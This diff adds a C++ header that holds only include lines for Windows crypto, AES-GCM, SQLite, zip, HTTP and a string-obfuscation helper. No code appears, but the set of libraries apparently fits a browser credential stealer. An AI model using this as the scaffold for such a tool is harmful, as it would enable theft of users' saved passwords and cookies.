@@ -1,0 +1,26 @@
+#pragma once
+
+#include <iostream>
+#include <atomic>
+#include <map>
+#include <tuple>
+#include <regex>
+#include <numeric>
+#include <thread>
+#include <algorithm>
+#include <fstream>
+#include <filesystem>
+#include <sstream>
+#include <string_view>
+#include <Windows.h>
+#include <wincrypt.h>
+#include <cpr/cpr.h>
+#include <cryptopp/aes.h>
+#include <cryptopp/filters.h>
+#include <cryptopp/gcm.h>
+#include <nlohmann/json.hpp>
+#include "base64.h"
+#include "XorString.h"
+#include "cpuinfo.h"
+#include <sqlite3.h>
+#include <libzippp/libzippp.h>
